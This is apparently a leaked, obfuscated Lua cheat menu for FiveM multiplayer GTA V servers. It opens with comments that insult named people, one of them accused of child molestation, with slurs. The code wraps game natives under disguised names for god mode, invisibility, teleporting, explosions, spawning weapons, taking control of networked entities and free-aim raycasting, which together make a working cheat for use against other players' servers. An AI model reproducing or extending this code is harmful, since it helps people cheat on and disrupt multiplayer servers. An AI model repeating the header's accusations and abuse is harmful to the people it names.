-- Fetched and leaked by GreenGaming, also known as the child molester. He likes to harras 12 years old, apparently.

-- Don't be mad, be happy. Oh and Yedo you're a sad little cunt who scams. Imagine charging 100â‚¬ for a lua menu, and here it is free for everyone. Nobody likes you, not even hammafia apparently.

-- So here it is, brought to you by GreenGaming, memeEngine owner :-)




local __REAPER25__ = Citizen.CreateThread
local __REAPER26__ = Citizen.Wait
local __REAPER27__ = RegisterNetEvent
local __REAPER28__ = RemoveEventHandler
local __REAPER29__ = AddEventHandler

__REAPER25__(function()
    local __REAPER1__ = {}

    __REAPER1__.T = {} --table
    __REAPER1__.V = {} --vars
    __REAPER1__.A = {} --loop string keyk
    __REAPER1__.M = {} --menu func
    __REAPER1__.N = {} --nat??v
    __REAPER1__.F = {} --function
    __REAPER1__.E = {} --eventek

    __REAPER1__.N.ReaperInvoke = Citizen.InvokeNative
    function __REAPER1__.N.AddTextEntry(p1,p2) return __REAPER1__.N.ReaperInvoke(0x32ca01c3, tostring(p1), tostring(p2)) end
    function __REAPER1__.N.TextColor(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xBE6B23FFA53FB442, p1, p2, p3, p4) end
    function __REAPER1__.N.TextFont(p1) return __REAPER1__.N.ReaperInvoke(0x66E0276CC5F6B9DA, p1) end
    function __REAPER1__.N.TextScale(p1,p2) return __REAPER1__.N.ReaperInvoke(0x07C837F9A01C34C9, p1, p2) end
    function __REAPER1__.N.TextCentre(p1) return __REAPER1__.N.ReaperInvoke(0xC02F4DBFB51D988B, p1) end
    function __REAPER1__.N.TextRightJustify(p1) return __REAPER1__.N.ReaperInvoke(0x6B3C4650BC8BEE47, p1) end
    function __REAPER1__.N.TextEntry(p1) return __REAPER1__.N.ReaperInvoke(0x25FBB336DF1804CB, p1) end
    function __REAPER1__.N.TextShadow() return __REAPER1__.N.ReaperInvoke(0x1CA3E9EAC9D93E5E) end
    function __REAPER1__.N.TextOutline() return __REAPER1__.N.ReaperInvoke(0x2513DFB0FB8400FE) end
    function __REAPER1__.N.TextWrap(p1,p2) return __REAPER1__.N.ReaperInvoke(0x63145D9C883A1A70, p1, p2) end
    function __REAPER1__.N.TextString(p1) return __REAPER1__.N.ReaperInvoke(0x6C188BE134E074AA, p1) end
    function __REAPER1__.N.TextDraw(p1,p2) return __REAPER1__.N.ReaperInvoke(0xCD015E5BB0D96A57, p1, p2) end
    function __REAPER1__.N.DrawRect(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0x3A618A217E5154F0, p1, p2, p3, p4, p5, p6, p7, p8) end
    function __REAPER1__.N.GetGameTimer() return __REAPER1__.N.ReaperInvoke(0x9CD27B0045628463, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetMouseCursorActiveThisFrame() return __REAPER1__.N.ReaperInvoke(0xAAE7CE1D63167423) end
    function __REAPER1__.N.GetNuiCursorPosition() return __REAPER1__.N.ReaperInvoke(0xbdba226f, Citizen.PointerValueInt(), Citizen.PointerValueInt()) end
    function __REAPER1__.N.DisableAllControlActions(p1) return __REAPER1__.N.ReaperInvoke(0x5F4B6931816E599B, p1) end
    function __REAPER1__.N.CreateDui(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x23eaf899, tostring(p1), p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()) end
    function __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xb135472b, p1, p2, tostring(p3), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()) end
    function __REAPER1__.N.CreateRuntimeTxd(p1) return __REAPER1__.N.ReaperInvoke(0x1f3ac778, tostring(p1), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()) end
    function __REAPER1__.N.GetDuiHandle(p1) return __REAPER1__.N.ReaperInvoke(0x1655d41d, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.CreateRuntimeTextureFromImage(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x786d8bc3, p1, tostring(p2), tostring(p3), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()) end
    function __REAPER1__.N.DestroyDui(p1) return __REAPER1__.N.ReaperInvoke(0xa085cb10, p1) end
    function __REAPER1__.N.GetFrameTime() return __REAPER1__.N.ReaperInvoke(0x15C40837039FFAF7, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.GetEntityCoords(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3FEF770D40960D5A, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetEntityHeading(p1) return __REAPER1__.N.ReaperInvoke(0xE83D4F9BA2A38914, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.PedId() return __REAPER1__.N.ReaperInvoke(0xD80958FC74E988A6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetEntityMaxHealth(p1,p2) return __REAPER1__.N.ReaperInvoke(0x166E7CF68597D8B5, p1, p2) end
    function __REAPER1__.N.SetPlayerMaxArmour(p1,p2) return __REAPER1__.N.ReaperInvoke(0x77DFCCF5948B8C71, p1, p2) end
    function __REAPER1__.N.PlayersId() return __REAPER1__.N.ReaperInvoke(0x4F8644AF03D0E0D6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetEntityHealth(p1,p2) return __REAPER1__.N.ReaperInvoke(0x6B76DC1F3AE6E6A3, p1, p2) end
    function __REAPER1__.N.SetPedArmour(p1,p2) return __REAPER1__.N.ReaperInvoke(0xCEA04D83135264CC, p1, p2) end
    function __REAPER1__.N.ResetPlayerStamina(p1) return __REAPER1__.N.ReaperInvoke(0xA6F312FCCE9C1DFE, p1) end
    function __REAPER1__.N.GetPlayerSprintStaminaRemaining(p1) return __REAPER1__.N.ReaperInvoke(0x3F9F16F8E65A7ED7, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.SetEntityVisible(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xEA1C610A04DB6BBB, p1, p2, p3) end
    function __REAPER1__.N.SetEntityAlpha(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x44A0870B7E92D7C0, p1, p2, p3) end
    function __REAPER1__.N.SetPedToRagdoll(p1,p2,p3,p4,p5,p6,p7) return __REAPER1__.N.ReaperInvoke(0xAE99FB955581844A, p1, p2, p3, p4, p5, p6, p7, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetPedCanRagdoll(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB128377056A54E2A, p1, p2) end
    function __REAPER1__.N.FreezeEntityPosition(p1,p2) return __REAPER1__.N.ReaperInvoke(0x428CA6DBD1094446, p1, p2) end
    function __REAPER1__.N.SetPedSuffersCriticalHits(p1,p2) return __REAPER1__.N.ReaperInvoke(0xEBD76F2359F190AC, p1, p2) end
    function __REAPER1__.N.SetPedDiesInWater(p1,p2) return __REAPER1__.N.ReaperInvoke(0x56CEF0AC79073BDE, p1, p2) end
    function __REAPER1__.N.SetPedMinGroundTimeForStungun(p1,p2) return __REAPER1__.N.ReaperInvoke(0xFA0675AB151073FA, p1, p2) end
    function __REAPER1__.N.SetPlayerHealthRechargeMultiplier(p1,p2) return __REAPER1__.N.ReaperInvoke(0x5DB660B38DD98A31, p1, p2) end
    function __REAPER1__.N.ClearPedSecondaryTask(p1) return __REAPER1__.N.ReaperInvoke(0x176CECF6F920D707, p1) end
    function __REAPER1__.N.ClearPedTasks(p1) return __REAPER1__.N.ReaperInvoke(0xE1EF3C1216AFF2CD, p1) end
    function __REAPER1__.N.ClearPedTasksImmediately(p1) return __REAPER1__.N.ReaperInvoke(0xAAA34F8A7CB32098, p1) end
    function __REAPER1__.N.SetMaxWantedLevel(p1) return __REAPER1__.N.ReaperInvoke(0xAA5F02DB48D704B9, p1) end
    function __REAPER1__.N.ClearPlayerWantedLevel(p1) return __REAPER1__.N.ReaperInvoke(0xB302540597885499, p1) end
    function __REAPER1__.N.SetPlayerWantedLevel(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x39FF19C64EF7DA5B, p1, p2, p3) end
    function __REAPER1__.N.SetPlayerCanBeHassledByGangs(p1,p2) return __REAPER1__.N.ReaperInvoke(0xD5E460AD7020A246, p1, p2) end
    function __REAPER1__.N.TaskJump(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x0AE4086104E067B1, p1, p2, p3, p4) end
    function __REAPER1__.N.StatSetInt(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xB3271D7AB655B441, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.StatGetInt(p1,p2) return __REAPER1__.N.ReaperInvoke(0x767FBC2AC802EF3D, p1, Citizen.PointerValueInt(), p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetRunSprintMultiplierForPlayer(p1,p2) return __REAPER1__.N.ReaperInvoke(0x6DB47AA77FD94E09, p1, p2) end
    function __REAPER1__.N.SetSwimMultiplierForPlayer(p1,p2) return __REAPER1__.N.ReaperInvoke(0xA91C6F0FF7D16A13, p1, p2) end
    function __REAPER1__.N.SetPedMoveRateOverride(p1,p2) return __REAPER1__.N.ReaperInvoke(0x085BF80FA50A39D1, p1, p2) end
    function __REAPER1__.N.SetSuperJumpThisFrame(p1) return __REAPER1__.N.ReaperInvoke(0x57FFF03E423A4C0B, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.TaskSkyDive(p1) return __REAPER1__.N.ReaperInvoke(0x601736CFE536B0A0, p1) end
    function __REAPER1__.N.DisableControlAction(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xFE99B66D079CF6BC, p1, p2, p3) end
    function __REAPER1__.N.GetGameplayCamRot(p1) return __REAPER1__.N.ReaperInvoke(0x837765A25378F0BB, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetDisabledControlNormal(p1,p2) return __REAPER1__.N.ReaperInvoke(0x11E65974A982637C, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.SetEntityCoordsNoOffset(p1,p2,p3,p4,p5,p6,p7) return __REAPER1__.N.ReaperInvoke(0x239A3351AC1DA385, p1, p2, p3, p4, p5, p6, p7) end
    function __REAPER1__.N.SetEntityRotation(p1,p2,p3,p4,p5,p6) return __REAPER1__.N.ReaperInvoke(0x8524A8B0171D5E07, p1, p2, p3, p4, p5, p6) end
    function __REAPER1__.N.SetFocusPosAndVel(p1,p2,p3,p4,p5,p6) return __REAPER1__.N.ReaperInvoke(0xBB7454BAFF08FE25, p1, p2, p3, p4, p5, p6) end
    function __REAPER1__.N.SetEntityCollision(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x1A9205C1B9EE827F, p1, p2, p3) end
    function __REAPER1__.N.ReaperGod(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x7022BD828FA0B082, p1, not p3, p2) end
    function __REAPER1__.N.SetEntityHeading(p1,p2) return __REAPER1__.N.ReaperInvoke(0x8E2530AA8ADA980E, p1, p2) end
    function __REAPER1__.N.GetOffsetFromEntityInWorldCoords(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x1899F328B0E12848, p1, p2, p3, p4, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.TaskSmartFleeCoord(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0x94587F17E9C365D5, p1, p2, p3, p4, p5, p6, p7, p8) end
    function __REAPER1__.N.SetPedFleeAttributes(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x70A2D1137C8ED7C9, p1, p2, p3) end
    function __REAPER1__.N.SetPedHearingRange(p1,p2) return __REAPER1__.N.ReaperInvoke(0x33A8F7F7D5F7F33C, p1, p2) end
    function __REAPER1__.N.SetPedSeeingRange(p1,p2) return __REAPER1__.N.ReaperInvoke(0xF29CF591C4BF6CEE, p1, p2) end
    function __REAPER1__.N.IsPedInAnyVehicle(p1,p2) return __REAPER1__.N.ReaperInvoke(0x997ABD671D25CA0B, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.HasCollisionLoadedAroundEntity(p1) return __REAPER1__.N.ReaperInvoke(0xE9676F61BC0B3321, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestCollisionAtCoord(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x07503F7948F491A7, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsPedWalking(p1) return __REAPER1__.N.ReaperInvoke(0xDE4C184B2B9B071A, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsPedJumping(p1) return __REAPER1__.N.ReaperInvoke(0xCEDABC5900A0BF97, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.TaskWanderStandard(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xBB9CE077274F6A1B, p1, p2, p3) end
    function __REAPER1__.N.IsPedFleeing(p1) return __REAPER1__.N.ReaperInvoke(0xBBCCE00B381F8482, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetEntityInvincible(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3882114BDE571AD4, p1, p2) end
    function __REAPER1__.N.SetEntityCanBeDamaged(p1,p2) return __REAPER1__.N.ReaperInvoke(0x1760FFA8AB074D66, p1, p2) end
    function __REAPER1__.N.HasModelLoaded(p1) return __REAPER1__.N.ReaperInvoke(0x98A4EB5D89A0C952, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestModel(p1) return __REAPER1__.N.ReaperInvoke(0x963D27A58DF860AC, p1) end
    function __REAPER1__.N.CreateObject(p1,p2,p3,p4,p5,p6,p7) return __REAPER1__.N.ReaperInvoke(0x509D5878EB39E842, p1, p2, p3, p4, p5, p6, p7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetModelAsNoLongerNeeded(p1) return __REAPER1__.N.ReaperInvoke(0xE532F5D78798DAAB, p1) end
    function __REAPER1__.N.AttachEntityToEntity(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14,p15) return __REAPER1__.N.ReaperInvoke(0x6B9BBD38AB0796DF, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15) end
    function __REAPER1__.N.SetEntityProofs(p1,p2,p3,p4,p5,p6,p7,p8,p9) return __REAPER1__.N.ReaperInvoke(0xFAEE099C6F890BB8, p1, p2, p3, p4, p5, p6, p7, p8, p9) end
    function __REAPER1__.N.DoesEntityExist(p1) return __REAPER1__.N.ReaperInvoke(0x7239B21A38F536BA, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.NetworkGetEntityIsNetworked(p1) return __REAPER1__.N.ReaperInvoke(0xC7827959479DCC78, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.NetworkHasControlOfEntity(p1) return __REAPER1__.N.ReaperInvoke(0x01BF60A500E28887, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.NetworkGetNetworkIdFromEntity(p1) return __REAPER1__.N.ReaperInvoke(0xA11700682F3AD45C, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetNetworkIdExistsOnAllMachines(p1,p2) return __REAPER1__.N.ReaperInvoke(0xE05E81A888FA63C8, p1, p2) end
    function __REAPER1__.N.SetNetworkIdCanMigrate(p1,p2) return __REAPER1__.N.ReaperInvoke(0x299EEB23175895FC, p1, p2) end
    function __REAPER1__.N.NetworkRequestControlOfEntity(p1) return __REAPER1__.N.ReaperInvoke(0xB69317BF5E782347, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetNumberOfPedDrawableVariations(p1,p2) return __REAPER1__.N.ReaperInvoke(0x27561561732A7842, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetNumberOfPedTextureVariations(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x8F7156A3142A6BAD, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetPedConfigFlag(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x1913FE4CBF41C463, p1, p2, p3) end
    function __REAPER1__.N.ApplyForceToEntity(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14) return __REAPER1__.N.ReaperInvoke(0xC5F68BE9613E2D18, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14) end
    function __REAPER1__.N.SetEntityHasGravity(p1,p2) return __REAPER1__.N.ReaperInvoke(0x4A4722448F18EEF5, p1, p2) end
    function __REAPER1__.N.GetWaterHeight(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xF6829842C06AE524, p1, p2, p3, Citizen.PointerValueFloatInitialized(p4), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsEntityInWater(p1) return __REAPER1__.N.ReaperInvoke(0xCFB0A0D8EDD145A3, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetPedComponentVariation(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.GetHashKey(p1) return __REAPER1__.N.ReaperInvoke(0xD24D37CC275948CC, tostring(p1), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsModelInCdimage(p1) return __REAPER1__.N.ReaperInvoke(0x35B9E0803292B641, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsModelValid(p1) return __REAPER1__.N.ReaperInvoke(0xC0296A2EDF545E92, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetPedRandomComponentVariation(p1,p2) return __REAPER1__.N.ReaperInvoke(0xC8A9481A01E63C28, p1, p2) end
    function __REAPER1__.N.SetPlayerModel(p1,p2) return __REAPER1__.N.ReaperInvoke(0x00A1CADD00108836, p1, p2) end
    function __REAPER1__.N.SetTimecycleModifierStrength(p1) return __REAPER1__.N.ReaperInvoke(0x82E7FFCD5B2326B3, p1) end
    function __REAPER1__.N.SetSeethrough(p1) return __REAPER1__.N.ReaperInvoke(0x7E08924259E08CE0, p1) end
    function __REAPER1__.N.SetTimecycleModifier(p1) return __REAPER1__.N.ReaperInvoke(0x2C933ABF17A1DF41, tostring(p1)) end
    function __REAPER1__.N.SetNightvision(p1) return __REAPER1__.N.ReaperInvoke(0x18F621F7A5B1F85D, p1) end
    function __REAPER1__.N.RequestAnimSet(p1) return __REAPER1__.N.ReaperInvoke(0x6EA47DAE7FAD0EED, tostring(p1)) end
    function __REAPER1__.N.HasAnimSetLoaded(p1) return __REAPER1__.N.ReaperInvoke(0xC4EA073D86FB29B0, tostring(p1), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RemoveAnimSet(p1) return __REAPER1__.N.ReaperInvoke(0x16350528F93024B3, tostring(p1)) end
    function __REAPER1__.N.HasAnimDictLoaded(p1) return __REAPER1__.N.ReaperInvoke(0xD031A9162D01088C, tostring(p1), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestAnimDict(p1) return __REAPER1__.N.ReaperInvoke(0xD3BD40951412FEF6, tostring(p1)) end
    function __REAPER1__.N.TaskPlayAnim(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11) return __REAPER1__.N.ReaperInvoke(0xEA47FE3719165B94, p1, tostring(p2), tostring(p3), p4, p5, p6, p7, p8, p9, p10, p11) end
    function __REAPER1__.N.RemoveAnimDict(p1) return __REAPER1__.N.ReaperInvoke(0xF66A602F829E2A06, tostring(p1)) end
    function __REAPER1__.N.ResetPedMovementClipset(p1,p2) return __REAPER1__.N.ReaperInvoke(0xAA74EC0CB0AAEA2C, p1, p2) end
    function __REAPER1__.N.TaskStartScenarioInPlace(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x142A02425FF02BD9, p1, tostring(p2), p3, p4) end
    function __REAPER1__.N.SetPedMovementClipset(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xAF8A94EDE7712BEF, p1, tostring(p2), p3) end
    function __REAPER1__.N.HasScaleformLoaded(p1) return __REAPER1__.N.ReaperInvoke(0xDF6E5987D2B4D140, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestScaleform(p1) return __REAPER1__.N.ReaperInvoke(0x11FE353CF9733E6F, tostring(p1), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.BeginScaleform(p1,p2) return __REAPER1__.N.ReaperInvoke(0xF6E48914C7A8694E, p1, tostring(p2), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.ScaleformAddParamInt(p1) return __REAPER1__.N.ReaperInvoke(0xC3D0841A0CC546A6, p1) end
    function __REAPER1__.N.EndScaleformMovieMethod() return __REAPER1__.N.ReaperInvoke(0xC6796A8FFA375E53) end
    function __REAPER1__.N.DrawScaleformMovieFullscreen(p1,p2,p3,p4,p5,p6) return __REAPER1__.N.ReaperInvoke(0x0DF606929C105BE1, p1, p2, p3, p4, p5, p6) end
    function __REAPER1__.N.SetCursorLocation(p1,p2) return __REAPER1__.N.ReaperInvoke(0xFC695459D4D0E219, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetActiveScreenResolution() return __REAPER1__.N.ReaperInvoke(0x873C9F3104101DD3, Citizen.PointerValueInt(), Citizen.PointerValueInt()) end
    function __REAPER1__.N.SetDuiUrl(p1,p2) return __REAPER1__.N.ReaperInvoke(0xF761D9F3, p1, tostring(p2)) end
    function __REAPER1__.N.SetPedAsCop(p1,p2) return __REAPER1__.N.ReaperInvoke(0xBB03C38DD3FB7FFD, p1, p2) end
    function __REAPER1__.N.GetEntityModel(p1) return __REAPER1__.N.ReaperInvoke(0x9F47B058362C84B5, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetNumberOfPedPropDrawableVariations(p1,p2) return __REAPER1__.N.ReaperInvoke(0x5FAF9754E789FB47, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetNumberOfPedPropTextureVariations(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xA6E7F1CEB523E171, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetPedPropIndex(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x93376B65A266EB5F, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.ClearPedProp(p1, p2) return __REAPER1__.N.ReaperInvoke(0x0943E5B8E078E76E, p1, p2) end
    function __REAPER1__.N.SetPedDefaultComponentVariation(p1) return __REAPER1__.N.ReaperInvoke(0x45EEE61580806D63, p1) end
    function __REAPER1__.N.SetPedRandomProps(p1) return __REAPER1__.N.ReaperInvoke(0xC44AA05345C992C6, p1) end
    function __REAPER1__.N.SetPedRagdollForceFall(p1) return __REAPER1__.N.ReaperInvoke(0x01F6594B923B9251, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetPedRagdollOnCollision(p1,p2) return __REAPER1__.N.ReaperInvoke(0xF0A4F1BBF4FA7497, p1, p2) end
    function __REAPER1__.N.GameTable(p1) return msgpack.unpack(__REAPER1__.N.ReaperInvoke(0x2b9d4f50, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsObject())) end
    function __REAPER1__.N.CreateExplosion(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0xE3AD2BDBAEE269AC, p1, p2, p3, p4, p5, p6, p7, p8) end
    function __REAPER1__.N.DrawMarker(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14,p15,p16,p17,p18,p19,p20,p21,p22,p23,p24) return __REAPER1__.N.ReaperInvoke(0x28477EC23D892089, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24) end
    function __REAPER1__.N.GetVehiclePedIsIn(p1,p2) return __REAPER1__.N.ReaperInvoke(0x9A9112A0FE9A4713, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsPedAPlayer(p1) return __REAPER1__.N.ReaperInvoke(0x12534C348C6CB68B, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.HasPedGotWeapon(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x8DECB02F88F428BC, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GiveWeaponToPed(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0xBF0FD6E56C964FCB, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.RemoveWeaponFromPed(p1,p2) return __REAPER1__.N.ReaperInvoke(0x4899CB088EDF59B8, p1, p2) end
    function __REAPER1__.N.SetPedAmmo(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x14E56BC5B5DB6A19, p1, p2, p3) end
    function __REAPER1__.N.GetCurrentPedWeapon(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3A87E44BB9A01D54, p1, Citizen.PointerValueInt(), p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetPedLastWeaponImpactCoord(p1) return __REAPER1__.N.ReaperInvoke(0x6C4D0409BA1A2BC2, p1, Citizen.PointerValueVector(), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetEntityForwardVector(p1) return __REAPER1__.N.ReaperInvoke(0x0A794A5A57F8DF91, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetGameplayCamCoord() return __REAPER1__.N.ReaperInvoke(0x14D6F5678D8F1B37, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetShapeTestResult(p1) return __REAPER1__.N.ReaperInvoke(0x3D87450E15D98694, p1, Citizen.PointerValueInt(), Citizen.PointerValueVector(), Citizen.PointerValueVector(), Citizen.PointerValueInt(), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.StartShapeTestRay(p1,p2,p3,p4,p5,p6,p7,p8,p9) return __REAPER1__.N.ReaperInvoke(0x377906D8A31E5586, p1, p2, p3, p4, p5, p6, p7, p8, p9, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetEntityPlayerIsFreeAimingAt(p1,p2) return __REAPER1__.N.ReaperInvoke(0x2975C866E6713290, p1, Citizen.PointerValueIntInitialized(p2), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.DisablePlayerFiring(p1,p2) return __REAPER1__.N.ReaperInvoke(0x5E6CC07646BBEAB8, p1, p2) end
    function __REAPER1__.N.IsPlayerFreeAiming(p1) return __REAPER1__.N.ReaperInvoke(0x2E397FD2ECD37C87, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.ResetEntityAlpha(p1) return __REAPER1__.N.ReaperInvoke(0x9B1E824FFBB7027A, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.ShootSingleBulletBetweenCoords(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13) return __REAPER1__.N.ReaperInvoke(0x867654CBC7606F2C, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13) end
    function __REAPER1__.N.GetSelectedPedWeapon(p1) return __REAPER1__.N.ReaperInvoke(0x0A6DB4965674D243, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.CreateVehicle(p1,p2,p3,p4,p5,p6,p7) return __REAPER1__.N.ReaperInvoke(0xAF35D0D2583051B0, p1, p2, p3, p4, p5, p6, p7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsPedShooting(p1) return __REAPER1__.N.ReaperInvoke(0x34616828CD07F1A1, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetEntityMaxHealth(p1) return __REAPER1__.N.ReaperInvoke(0x15D757606D170C3C, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetEntityRotation(p1,p2) return __REAPER1__.N.ReaperInvoke(0xAFBD61CC738D9EB9, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetEntityVelocity(p1) return __REAPER1__.N.ReaperInvoke(0x4805D2B1D8CF94A9, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetEntityHealth(p1) return __REAPER1__.N.ReaperInvoke(0xEEF059FAD016D209, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsEntityDead(p1) return __REAPER1__.N.ReaperInvoke(0x5F9532F3B5CC2551, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetPedSourceOfDeath(p1) return __REAPER1__.N.ReaperInvoke(0x93C8B64DEB84728C, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
